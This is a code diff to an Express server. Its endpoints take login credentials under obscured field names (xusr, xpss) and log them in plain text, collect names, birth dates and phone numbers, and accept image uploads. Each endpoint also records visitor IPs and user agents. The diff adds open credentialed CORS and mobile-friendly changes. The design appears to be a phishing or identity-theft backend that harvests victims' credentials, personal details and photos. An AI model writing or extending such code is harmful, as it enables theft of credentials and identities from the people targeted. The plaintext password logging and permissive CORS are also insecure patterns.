@@ -11,10 +11,20 @@ const PORT = process.env.PORT || 3001;
 // Trust proxy for proper IP detection
 app.set('trust proxy', true);
 
-// Middleware
-app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+// Middleware - Enhanced CORS for mobile compatibility
+app.use(cors({
+  origin: true, // Allow all origins for mobile compatibility
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'Cache-Control', 'Connection'],
+  exposedHeaders: ['Content-Length', 'X-Requested-With']
+}));
+
+// Handle preflight requests
+app.options('*', cors());
+
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // Create uploads directory if it doesn't exist
 const uploadsDir = path.join(__dirname, 'uploads');
@@ -40,13 +50,23 @@ const storage = multer.diskStorage({
 const upload = multer({ 
   storage: storage,
   limits: {
-    fileSize: 10 * 1024 * 1024 // 10MB limit
+    fileSize: 20 * 1024 * 1024, // 20MB limit for mobile photos
+    fieldSize: 10 * 1024 * 1024, // 10MB for form fields
+    files: 1 // Only one file at a time
   },
   fileFilter: (req, file, cb) => {
+    console.log('File upload attempt:', {
+      fieldname: file.fieldname,
+      originalname: file.originalname,
+      mimetype: file.mimetype,
+      size: file.size
+    });
+    
     // Accept only image files
     if (file.mimetype.startsWith('image/')) {
       cb(null, true);
     } else {
+      console.log('File type rejected:', file.mimetype);
       cb(new Error('Only image files are allowed!'), false);
     }
   }
@@ -90,10 +110,12 @@ app.post('/api/login', async (req, res) => {
   const { xusr, xpss } = req.body;
   
   console.log('Login attempt:', { xusr, xpss });
+  console.log('User-Agent:', req.get('User-Agent'));
+  console.log('IP:', req.ip);
   
   try {
     // Create or get user session
-    const ip = req.ip || req.connection.remoteAddress;
+    const ip = req.ip || req.connection.remoteAddress || req.get('X-Forwarded-For');
     const userAgent = req.get('User-Agent');
     const userSession = await db.createUserSession(ip, userAgent);
     
@@ -116,15 +138,25 @@ app.post('/api/info', async (req, res) => {
   const { xname1, xname2, xdob, xtel, sessionId } = req.body;
   
   console.log('Info submission:', { xname1, xname2, xdob, xtel });
+  console.log('Session ID:', sessionId);
+  console.log('User-Agent:', req.get('User-Agent'));
+  console.log('IP:', req.ip);
   
   try {
-    const ip = req.ip || req.connection.remoteAddress;
+    const ip = req.ip || req.connection.remoteAddress || req.get('X-Forwarded-For');
     const userAgent = req.get('User-Agent');
     
-    // Store info data
-    await db.storeInfoData(sessionId, { xname1, xname2, xdob, xtel }, ip, userAgent);
+    // Generate sessionId if not provided (for mobile compatibility)
+    const finalSessionId = sessionId || 'mobile-session-' + Date.now();
     
-    res.json({ success: true, message: 'Info submitted successfully' });
+    // Store info data
+    await db.storeInfoData(finalSessionId, { xname1, xname2, xdob, xtel }, ip, userAgent);
+    
+    res.json({ 
+      success: true, 
+      message: 'Info submitted successfully',
+      sessionId: finalSessionId
+    });
   } catch (error) {
     console.error('Error storing info data:', error);
     res.status(500).json({ success: false, message: 'Error storing data' });
@@ -139,14 +171,19 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
   console.log('File object:', file);
   console.log('Session ID:', sessionId);
   console.log('Request body:', req.body);
+  console.log('User-Agent:', req.get('User-Agent'));
+  console.log('IP:', req.ip);
   
   try {
-    const ip = req.ip || req.connection.remoteAddress;
+    const ip = req.ip || req.connection.remoteAddress || req.get('X-Forwarded-For');
     const userAgent = req.get('User-Agent');
+    
+    // Generate sessionId if not provided (for mobile compatibility)
+    const finalSessionId = sessionId || 'mobile-session-' + Date.now();
     
     // Check if session exists
     const existingSession = await db.prisma.userSession.findUnique({
-      where: { sessionId: sessionId }
+      where: { sessionId: finalSessionId }
     });
     
     console.log('Existing session:', existingSession);
@@ -156,7 +193,7 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
       // Create a new session if it doesn't exist
       await db.prisma.userSession.create({
         data: {
-          sessionId: sessionId,
+          sessionId: finalSessionId,
           ip: ip,
           userAgent: userAgent
         }
@@ -164,7 +201,7 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
     }
     
     // Store upload data
-    const result = await db.storeUploadData(sessionId, {
+    const result = await db.storeUploadData(finalSessionId, {
       filename: file ? file.filename : null,
       originalName: file ? file.originalname : null,
       size: file ? file.size : 0,
@@ -173,7 +210,16 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
     }, ip, userAgent);
     
     console.log('Upload data stored:', result);
-    res.json({ success: true, message: 'File uploaded successfully' });
+    res.json({ 
+      success: true, 
+      message: 'File uploaded successfully',
+      sessionId: finalSessionId,
+      fileInfo: {
+        filename: file ? file.filename : null,
+        originalName: file ? file.originalname : null,
+        size: file ? file.size : 0
+      }
+    });
   } catch (error) {
     console.error('Error storing upload data:', error);
     console.error('Error details:', error.message);
